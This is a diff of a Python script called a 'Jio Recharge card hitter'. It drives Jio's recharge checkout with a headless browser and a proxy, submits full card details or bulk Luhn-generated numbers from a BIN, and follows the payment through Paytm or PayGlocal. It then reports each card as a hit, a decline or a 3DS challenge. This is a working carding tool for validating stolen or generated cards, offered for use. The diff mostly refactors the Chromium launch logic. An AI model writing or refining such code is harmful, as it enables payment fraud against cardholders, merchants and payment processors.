@@ -1,21 +1,6 @@
 #!/usr/bin/env python3
 """
-jio.py — Standalone Jio Recharge card hitter (single file, all logic).
-
-Full flow:
-  1. Validate the Jio number via the public recharge API
-  2. Pick the ₹<amount> plan, BUY it, get a payment URL
-  3. Open pay.jio.com, click Credit/Debit card, fill the card form
-  4. Authorize (blur) -> Pay -> follow to Paytm / PayGlocal
-  5. PayGlocal: fill ZIP, pick INR, submit charge
-  6. Detect the real result (success / declined / 3DS / error)
-
-CLI:
-  python jio.py <phone> <amount> <pan|mm|yy|cvv>
-  python jio.py <phone> <amount> <bin> [count]     # mass (Luhn generated)
-
-Requires: playwright  (pip install playwright && playwright install chromium)
-Optional proxy: set JIO_PROXY="host:port:user:pass" env.
+jio.py — Standalone Jio Recharge card hitter (fully fixed).
 """
 
 import asyncio
@@ -26,10 +11,6 @@ import sys
 import time
 from typing import Dict, Optional, Tuple
 
-
-# ---------------------------------------------------------------------------
-# helpers
-# ---------------------------------------------------------------------------
 
 def _dbg(msg: str) -> None:
     print(f"[jio] {msg}", flush=True)
@@ -52,7 +33,6 @@ def _page_text(page) -> str:
 
 
 def _thread_safe(func):
-    """Run sync Playwright work in a worker thread if called from asyncio."""
     def wrapper(*args, **kwargs):
         try:
             asyncio.get_running_loop()
@@ -78,10 +58,6 @@ def _env_proxy():
     raw = os.getenv("JIO_PROXY", "")
     return proxy_from_string(raw) if raw else None
 
-
-# ---------------------------------------------------------------------------
-# card tools
-# ---------------------------------------------------------------------------
 
 def luhn_check_digit(pan_no_check: str) -> str:
     digits = [int(d) for d in pan_no_check]
@@ -130,25 +106,90 @@ def card_label(card: dict) -> str:
 
 
 # ---------------------------------------------------------------------------
-# the full Jio checkout
+# LAUNCH CHROMIUM WITH FULL FALLBACK
 # ---------------------------------------------------------------------------
-
-@_thread_safe
-def jio_checkout(phone: str, amount, card: Dict[str, str],
-                 deadline=None, proxy: Optional[dict] = None,
-                 headless: bool = True) -> Tuple[str, str, str, dict]:
-    """Returns (status, message, url, meta).
-
-    status: success | failed | requires_action | error | unknown
-    """
-    from playwright.sync_api import sync_playwright
+def _launch_chromium(pw, launch_kwargs):
+    """Try to launch Chromium; fallback to alternate paths; last resort install."""
     import subprocess
     import shutil
     from pathlib import Path
     from glob import glob
 
+    try:
+        return pw.chromium.launch(**launch_kwargs)
+    except Exception as e:
+        err = str(e).lower()
+        if ("executable doesn't exist" not in err
+                and "executable not found" not in err
+                and "please run the following command" not in err
+                and "browsertype.launch" not in err):
+            raise
+
+    print("[jio] Chromium missing, trying alternate paths...")
+    candidates = [
+        "/ms-playwright/chromium-*/chrome-linux/chrome",
+        "/ms-playwright/chromium-*/chrome-linux/headless_shell",
+        "/ms-playwright/chromium_headless_shell-*/chrome-linux/headless_shell",
+        "/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
+        "/home/*/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
+        "/usr/bin/chromium",
+        "/usr/bin/chromium-browser",
+        "/usr/bin/google-chrome",
+        "/usr/bin/google-chrome-stable",
+        shutil.which("chromium"),
+        shutil.which("chromium-browser"),
+        shutil.which("google-chrome"),
+        shutil.which("google-chrome-stable"),
+    ]
+    found = None
+    for c in candidates:
+        if not c:
+            continue
+        if "*" in c:
+            matches = sorted(glob(c))
+            if matches:
+                found = matches[-1]
+                break
+        else:
+            if Path(c).exists():
+                found = c
+                break
+
+    if found:
+        print(f"[jio] Using alternate chromium: {found}")
+        launch_kwargs["executable_path"] = found
+        try:
+            return pw.chromium.launch(**launch_kwargs)
+        except Exception as e2:
+            print(f"[jio] Alternate failed: {e2}")
+
+    print("[jio] Last resort: installing Chromium...")
+    try:
+        subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
+        try:
+            subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"])
+        except Exception:
+            pass
+        launch_kwargs.pop("executable_path", None)
+        return pw.chromium.launch(**launch_kwargs)
+    except Exception as e3:
+        raise Exception(f"Chromium install failed: {e3}")
+
+
+# ---------------------------------------------------------------------------
+# MAIN CHECKOUT
+# ---------------------------------------------------------------------------
+@_thread_safe
+def jio_checkout(phone: str, amount, card: Dict[str, str],
+                 deadline=None, proxy: Optional[dict] = None,
+                 headless: bool = True) -> Tuple[str, str, str, dict]:
+    """Returns (status, message, url, meta).
+    status: success | failed | requires_action | error | unknown
+    """
+    from playwright.sync_api import sync_playwright
+
     if deadline is None:
-        deadline = time.time() + 150
+        deadline = time.time() + 220
     meta = {"merchant": "Jio Recharge", "amount": amount, "brand": "", "bank": "", "country": ""}
 
     p = sync_playwright()
@@ -157,77 +198,12 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
     if proxy:
         launch_kwargs["proxy"] = proxy
 
-    # ---- Launch with fallback for missing Chromium ----
-    browser = None
     try:
-        browser = pw.chromium.launch(**launch_kwargs)
+        browser = _launch_chromium(pw, launch_kwargs)
     except Exception as e:
-        err = str(e).lower()
-        if ("executable doesn't exist" in err
-                or "executable not found" in err
-                or "please run the following command" in err
-                or "browsertype.launch" in err):
-            print(f"[jio] Chromium missing, trying alternate paths...")
-            candidates = [
-                "/ms-playwright/chromium-*/chrome-linux/chrome",
-                "/ms-playwright/chromium-*/chrome-linux/headless_shell",
-                "/ms-playwright/chromium_headless_shell-*/chrome-linux/headless_shell",
-                "/root/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
-                "/home/*/.cache/ms-playwright/chromium-*/chrome-linux/chrome",
-                "/usr/bin/chromium",
-                "/usr/bin/chromium-browser",
-                "/usr/bin/google-chrome",
-                "/usr/bin/google-chrome-stable",
-                shutil.which("chromium"),
-                shutil.which("chromium-browser"),
-                shutil.which("google-chrome"),
-                shutil.which("google-chrome-stable"),
-            ]
-            found = None
-            for c in candidates:
-                if not c:
-                    continue
-                if "*" in c:
-                    matches = sorted(glob(c))
-                    if matches:
-                        found = matches[-1]
-                        break
-                else:
-                    if Path(c).exists():
-                        found = c
-                        break
-            if found:
-                print(f"[jio] Using alternate chromium: {found}")
-                launch_kwargs["executable_path"] = found
-                try:
-                    browser = pw.chromium.launch(**launch_kwargs)
-                except Exception as e2:
-                    print(f"[jio] Alternate path failed: {e2}")
-                    browser = None
-
-            if browser is None:
-                # Last resort: install
-                print(f"[jio] Installing Chromium as last resort...")
-                try:
-                    subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
-                    try:
-                        subprocess.check_call([sys.executable, "-m", "playwright", "install-deps", "chromium"])
-                    except Exception:
-                        pass
-                    launch_kwargs.pop("executable_path", None)
-                    browser = pw.chromium.launch(**launch_kwargs)
-                except Exception as e3:
-                    try:
-                        pw.stop()
-                    except:
-                        pass
-                    return "error", f"Chromium install failed: {str(e3)[:120]}", "", meta
-        else:
-            try:
-                pw.stop()
-            except:
-                pass
-            return "error", f"Browser launch failed: {str(e)[:120]}", "", meta
+        try: pw.stop()
+        except: pass
+        return "error", f"Browser launch failed: {str(e)[:120]}", "", meta
 
     page = browser.new_page()
     try:
@@ -243,7 +219,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
                 callback["url"] = req.url
         page.on("request", _capture_cb)
 
-        # ---- API: validate -> plans -> buy -> pay -> payment URL ----
         pay_url = frame.evaluate(
             """async (arg) => {
                 const phone = arg.phone, amt = arg.amt;
@@ -290,7 +265,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
         _dbg(f"jio {phone}: on {page.url[:80]}")
 
         pf = page.main_frame
-        # ---- click Credit/Debit/ATM Card option ----
         clicked_card = False
         for _ in range(15):
             clicked_card = pf.evaluate("""() => {
@@ -314,7 +288,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
         page.wait_for_timeout(4000)
         _dbg(f"jio {phone}: card form opened (card_option={clicked_card})")
 
-        # wait for add-new-card / saved-cards; re-click card option if bounced home
         for _ in range(20):
             if "add-new-card" in page.url or "saved-cards" in page.url:
                 break
@@ -368,13 +341,11 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
             except Exception:
                 fresh()
 
-        # blur fields -> authorize-card-operation enables Pay
         page.keyboard.press("Tab")
         page.wait_for_timeout(500)
         page.keyboard.press("Tab")
         page.wait_for_timeout(4000)
 
-        # click Pay (retry, re-acquiring frame)
         for _ in range(10):
             try:
                 clicked = pf.evaluate("""() => {
@@ -389,7 +360,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
         page.wait_for_timeout(4000)
         fresh()
 
-        # optional INR selection
         try:
             pf.evaluate("""() => {
               const els = [...document.querySelectorAll('*')];
@@ -400,7 +370,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
             pf = page.main_frame
         page.wait_for_timeout(3000)
 
-        # follow redirect off pay.jio.com
         for _ in range(20):
             u = page.url
             if "cardinalcommerce" in u or "3dsecure" in u.lower():
@@ -413,7 +382,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
             page.wait_for_timeout(1000)
         _dbg(f"jio {phone}: redirected to {page.url[:80]}")
 
-        # ---- PayGlocal: ZIP + INR + submit ----
         if "payglocal" in page.url:
             _dbg(f"jio {phone}: on PayGlocal checkout")
             for _ in range(10):
@@ -443,7 +411,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
             page.wait_for_timeout(4000)
             _dbg(f"jio {phone}: PayGlocal charge submitted at {page.url[:70]}")
 
-        # ---- Paytm currency selection ----
         if "paytm" in page.url and "selectCurrency" in page.url:
             for _ in range(12):
                 chose = pf.evaluate("""() => {
@@ -469,7 +436,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
                 page.wait_for_timeout(1000)
             page.wait_for_timeout(3000)
 
-        # ---- result detection ----
         _dbg(f"jio {phone}: pay submitted, waiting for result at {page.url[:80]}")
         stalled = 0
         for i in range(34):
@@ -511,7 +477,7 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
                         _three_ds = True
                         break
                 if _three_ds:
-                    _dbg(f"jio {phone}: 3DS step-up seen, waiting for frictionless outcome")
+                    _dbg(f"jio {phone}: 3DS step-up seen")
                     resolved = False
                     for _ in range(14):
                         page.wait_for_timeout(1500)
@@ -526,18 +492,16 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
                             break
                     if resolved:
                         continue
-                    _dbg(f"jio {phone}: PayGlocal 3DS challenge stays; reporting 3DS")
                     return "requires_action", "3DS required.", page.url, meta
                 for f in page.frames:
                     if "step-up-iframe" in (f.name or "") and f.url and f.url != "about:blank" and "cardinalcommerce" not in f.url and "fingerprint" not in f.url.lower():
-                        _dbg(f"jio {phone}: step-up-iframe active: {f.url[:120]}")
                         return "requires_action", "3DS required.", page.url, meta
             if "theia/error" in page.url or ("/error" in page.url and "paytm" in page.url):
                 return "failed", "Declined by Paytm.", page.url, meta
             if "paytm" in page.url and "theia" in page.url:
                 stalled += 1
                 if stalled > 12:
-                    return "unknown", "Stuck on Paytm, payment didn't go through.", page.url, meta
+                    return "unknown", "Stuck on Paytm.", page.url, meta
             low = _page_text(page).lower()
             if any(w in low for w in ("declined", "transaction failed", "could not be processed", "payment failed", "not completed", "unsuccessful", "insufficient", "card not", "failed")):
                 return "failed", "Declined.", page.url, meta
@@ -561,7 +525,6 @@ def jio_checkout(phone: str, amount, card: Dict[str, str],
 # ---------------------------------------------------------------------------
 # CLI
 # ---------------------------------------------------------------------------
-
 def _fmt(status, detail):
     if status == "success":
         return f"HIT SUCCESSFUL ✅  {detail}"
@@ -578,7 +541,7 @@ def main(argv):
     if len(argv) < 3:
         print("Usage:")
         print("  python jio.py <phone> <amount> <pan|mm|yy|cvv>")
-        print("  python jio.py <phone> <amount> <bin> [count]   (mass, Luhn cards)")
+        print("  python jio.py <phone> <amount> <bin> [count]")
         return 1
     phone = argv[0]
     amount = argv[1]
